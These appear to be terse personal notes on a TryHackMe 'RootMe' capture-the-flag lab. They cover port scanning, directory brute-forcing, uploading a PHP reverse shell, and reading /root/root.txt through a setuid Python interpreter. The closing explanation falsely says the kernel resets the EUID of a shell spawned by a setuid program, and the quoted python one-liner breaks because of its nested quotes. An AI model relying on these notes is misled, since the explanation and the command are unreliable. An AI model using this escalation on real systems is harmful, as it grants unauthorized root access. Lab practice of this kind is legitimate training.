
nmap -sS -sV -p- ipaddress

gitbuster -u http://ipaddress -w .....medium

uploaded php shell from https://www.revshells.com/

 saw that python has s bit on
 
saw whatever executes with python excecutes with root
-i first opened a shell with python (system(/bin/sh)) and shwn i did whoami in it i was not root

-than i just did:
python -c "print (open("/root/root.txt").read())" - and it worked


#### why did the commands in the shell opened by python werent root
the python interperter process is the one running with root 
When a program (like the setuid-enabled Python interpreter) executes another program (like `/bin/sh`) using functions like `os.system()` or `os.execve()`, the operating system, for security reasons, often **drops the effective privileges** of the new child process.

1. The Python process (EUID = Root) calls `os.system("/bin/sh")`.
    
2. The kernel recognizes that this is an execution of an external program (`/bin/sh`).
    
3. To prevent a setuid program from easily spawning an arbitrary, fully privileged root shell for any user, the kernel **resets the EUID of the new shell process** back to the RUID (your non-root user).
    
    - The new `/bin/sh` process starts with both **RUID and EUID** set back to your user ID.
        
4. Therefore, when you run `whoami` inside that shell, it correctly reports your normal user account, not root.


https://iritt.medium.com/rootme-tryhackme-challenge-walkthrough-7d916aea497e
